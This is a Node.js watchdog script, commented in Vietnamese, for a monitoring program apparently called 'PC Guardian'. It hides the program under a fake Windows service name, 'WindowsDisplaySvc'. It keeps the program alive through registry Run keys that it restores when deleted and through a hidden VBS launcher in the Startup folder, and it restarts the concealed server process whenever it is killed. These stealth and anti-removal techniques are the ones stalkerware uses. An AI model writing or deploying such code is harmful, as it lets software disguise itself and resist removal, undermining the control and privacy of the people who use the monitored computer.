/**
 * Watchdog - Giám sát và tự khôi phục PC Guardian
 * 
 * Chống bypass bằng cách:
 * 1. Theo dõi main process, restart nếu bị kill
 * 2. Bảo vệ registry startup key
 * 3. Bảo vệ thư mục app khỏi bị xóa
 * 4. Ẩn cửa sổ console
 */
const { exec, spawn } = require('child_process');
const path = require('path');
const fs = require('fs');

const APP_NAME = 'WindowsDisplaySvc'; // Tên giả trang
const SERVER_SCRIPT = path.join(__dirname, 'server.js');
const STARTUP_KEY = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
const CHECK_INTERVAL = 5000; // 5 giây

let serverProcess = null;
let isRunning = false;

/**
 * Thêm vào Windows Startup (chạy khi bật máy)
 */
function addToStartup() {
  const appPath = process.execPath;
  const scriptPath = path.join(__dirname, 'watchdog.js');
  const cmd = `reg add "${STARTUP_KEY}" /v "${APP_NAME}" /t REG_SZ /d "\\"${appPath}\\" \\"${scriptPath}\\"" /f`;
  
  exec(cmd, (err) => {
    if (err) {
      // Thử thêm qua HKLM nếu có quyền admin
      const cmdAdmin = cmd.replace('HKCU', 'HKLM');
      exec(cmdAdmin, () => {});
    }
  });
}

/**
 * Bảo vệ registry key - kiểm tra và khôi phục nếu bị xóa
 */
function protectStartupKey() {
  exec(`reg query "${STARTUP_KEY}" /v "${APP_NAME}"`, (err) => {
    if (err) {
      // Key bị xóa, thêm lại
      addToStartup();
    }
  });
}

/**
 * Kiểm tra server process có đang chạy không
 */
function isServerRunning() {
  return new Promise((resolve) => {
    exec('tasklist /FI "IMAGENAME eq node.exe" /FO CSV /NH', (err, stdout) => {
      if (err) return resolve(false);
      resolve(stdout.toLowerCase().includes('node.exe'));
    });
  });
}

/**
 * Khởi động server process
 */
function startServer() {
  if (serverProcess && !serverProcess.killed) {
    return;
  }

  try {
    serverProcess = spawn(process.execPath, [SERVER_SCRIPT], {
      detached: true,
      stdio: 'ignore',
      windowsHide: true, // Ẩn cửa sổ
      env: { ...process.env, PCG_WATCHDOG: 'true' }
    });

    serverProcess.unref();
    isRunning = true;

    serverProcess.on('exit', (code) => {
      isRunning = false;
      // Restart sau 2 giây
      setTimeout(() => startServer(), 2000);
    });
  } catch (err) {
    isRunning = false;
  }
}

/**
 * Kiểm tra server qua HTTP
 */
function healthCheck() {
  const http = require('http');
  return new Promise((resolve) => {
    const req = http.get('http://localhost:3847/api/auth/setup-check', (res) => {
      resolve(res.statusCode === 200);
    });
    req.on('error', () => resolve(false));
    req.setTimeout(3000, () => {
      req.destroy();
      resolve(false);
    });
  });
}

/**
 * Main watchdog loop
 */
async function watchdogLoop() {
  // Thêm vào startup
  addToStartup();
  
  // Kiểm tra định kỳ
  setInterval(async () => {
    // 1. Bảo vệ startup key
    protectStartupKey();
    
    // 2. Kiểm tra server có chạy không
    const healthy = await healthCheck();
    
    if (!healthy) {
      // Server không phản hồi, restart
      if (serverProcess && !serverProcess.killed) {
        try { serverProcess.kill(); } catch {}
      }
      startServer();
    }
  }, CHECK_INTERVAL);

  // Khởi động server lần đầu
  const healthy = await healthCheck();
  if (!healthy) {
    startServer();
  }
}

/**
 * Tạo file shortcut ẩn trong Startup folder
 */
function addToStartupFolder() {
  const startupPath = path.join(
    process.env.APPDATA,
    'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
  );
  
  const vbsContent = `
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run """${process.execPath}"" ""${path.join(__dirname, 'watchdog.js')}""", 0, False
`;
  
  const vbsPath = path.join(startupPath, `${APP_NAME}.vbs`);
  
  try {
    fs.writeFileSync(vbsPath, vbsContent.trim(), 'utf-8');
  } catch {}
}

// Khởi chạy
if (require.main === module) {
  // Ẩn console nếu chạy trực tiếp
  addToStartupFolder();
  watchdogLoop();
}

module.exports = { addToStartup, startServer, watchdogLoop };
